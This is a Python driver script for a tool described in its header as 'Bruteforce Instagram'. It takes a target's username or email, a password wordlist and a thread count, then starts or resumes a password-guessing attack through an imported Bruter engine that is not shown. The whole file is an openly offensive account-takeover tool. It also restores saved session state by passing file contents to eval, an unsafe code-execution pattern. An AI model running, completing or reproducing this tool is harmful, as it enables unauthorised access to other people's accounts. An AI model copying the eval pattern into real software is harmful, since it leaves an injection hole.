# Date: 05/05/2018
# Author: Pure-L0G1C
# Description: Bruteforce Instagram

from sys import version 
from os.path import exists
from lib.bruter import Bruter 
from lib.session import Session 
from argparse import ArgumentParser

def _input(msg):
 return raw_input(msg).lower() if int(version.split()[0].split('.')[0]) == 2 else input(msg).lower()

def main():

 # assign arugments
 args = ArgumentParser()
 args.add_argument('username', help='email or username')
 args.add_argument('wordlist', help='password list')
 args.add_argument('threads', help='password per seconds. Any number <= 16')
 args = args.parse_args()

 if not exists(args.wordlist):
  exit('[!] Unable to locate `{}`'.format(args.wordlist))

 if not args.threads.isdigit():
  exit('[!] Threads must be a number')

 # assign variables
 engine = Bruter(args.username.title(), int(args.threads), args.wordlist)
 session = Session(args.username.title(), args.wordlist)

 if session.exists():
  if _input('Do you want to resume the attack? [y/n]: ').split()[0][0] == 'y':
   data = session.read()
   if data:
    engine.attempts = int(data['attempts'])
    engine.passlist.queue = eval(data['queue'])
    engine.retrieve = True

 # start attack
 try:
  engine.start()
 finally:
  if not engine.isFound:
   engine.display(engine.pwd)
   print('\n[!] Exiting ...')
  engine.stop()

if __name__ == '__main__':
 main()